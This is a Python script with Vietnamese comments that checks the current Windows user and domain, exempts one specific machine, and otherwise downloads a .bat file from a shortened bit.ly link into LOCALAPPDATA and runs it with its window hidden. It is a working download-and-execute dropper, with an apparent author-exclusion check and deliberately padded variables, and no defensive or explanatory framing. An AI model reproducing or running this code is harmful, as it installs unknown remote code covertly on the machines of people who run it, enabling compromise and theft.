import os  # Thư viện 'os' cho các thao tác hệ thống.
import requests  # Thư viện 'requests' để tải tệp từ internet.
import subprocess  # Thư viện 'subprocess' để thực thi các tiến trình hệ thống.

# Bước 1: Lấy thông tin người dùng và tên miền từ hệ thống.
# Sử dụng nhiều biến tạm thời để lưu trữ các thông tin không cần thiết.
username_env_variable = 'USERNAME'
userdomain_env_variable = 'USERDOMAIN'

# Biến lưu trữ kết quả lấy từ biến môi trường.
current_username = os.getenv(username_env_variable)
current_userdomain = os.getenv(userdomain_env_variable)

# Biến tạm thời để lưu tên người dùng và tên miền cần so sánh.
blocked_username = "hai1723"
blocked_userdomain = "DESKTOP-4V4R77Q"

# Bước 2: Sử dụng các biến trung gian để kiểm tra điều kiện.
is_username_blocked = (current_username == blocked_username)
is_userdomain_blocked = (current_userdomain == blocked_userdomain)

# Tạo thêm biến để lưu kết quả cuối cùng của việc kiểm tra.
should_block_operation = is_username_blocked and is_userdomain_blocked

# Bước 3: Kiểm tra kết quả và xử lý theo điều kiện.
if should_block_operation:
    # Nếu cả tên người dùng và tên miền bị chặn, in thông báo.
    block_message = "Operation blocked: User and domain are restricted."
    print(block_message)
else:
    # Nếu không bị chặn, tiếp tục xử lý tải và chạy tệp.
    
    # Bước 4: Khởi tạo thêm biến để lưu URL và thông tin tải tệp.
    base_url = "https://bit.ly"
    file_endpoint = "/fakebatman"
    full_url = base_url + file_endpoint
    
    # Khởi tạo thêm các biến không cần thiết cho đường dẫn tệp.
    env_variable_name = 'LOCALAPPDATA'
    output_directory = os.getenv(env_variable_name)
    
    file_name_prefix = "downloaded"
    file_extension = ".bat"
    output_filename = file_name_prefix + "_file" + file_extension
    
    # Kết hợp các phần đường dẫn thành đường dẫn đầy đủ.
    output_path = os.path.join(output_directory, output_filename)
    
    # Bước 5: Sử dụng nhiều biến để kiểm tra sự tồn tại của tệp.
    file_exists = os.path.exists(output_path)
    
    # Biến tạm thời để lưu thông báo in ra nếu tệp đã tồn tại.
    existence_message = "hello"
    
    if file_exists:
        # Nếu tệp đã tồn tại, in thông báo.
        print(existence_message)
    else:
        # Nếu tệp không tồn tại, tiến hành tải tệp.
        
        # Bước 6: Khởi tạo thêm biến tạm thời để lưu yêu cầu HTTP.
        response = requests.get(full_url)
        
        # Biến để lưu trạng thái của việc mở tệp.
        file_write_mode = 'wb'
        
        # Sử dụng thêm biến tạm thời để lưu trạng thái mở tệp.
        with open(output_path, file_write_mode) as file:
            file_content = response.content
            file.write(file_content)
        
        # Bước 7: Chuẩn bị chạy tệp .bat đã tải về.
        
        # Thêm các biến tạm thời để lưu các đối số của tiến trình.
        execution_arguments = [output_path]
        use_shell = True
        hide_window_flag = subprocess.CREATE_NO_WINDOW
        
        # Thực thi tệp .bat với cấu hình đã định.
        subprocess.Popen(
            execution_arguments,  # Đối số của tiến trình, đường dẫn đến tệp .bat.
            shell=use_shell,  # Cho phép chạy trong shell.
            creationflags=hide_window_flag  # Ẩn cửa sổ tiến trình.
        )
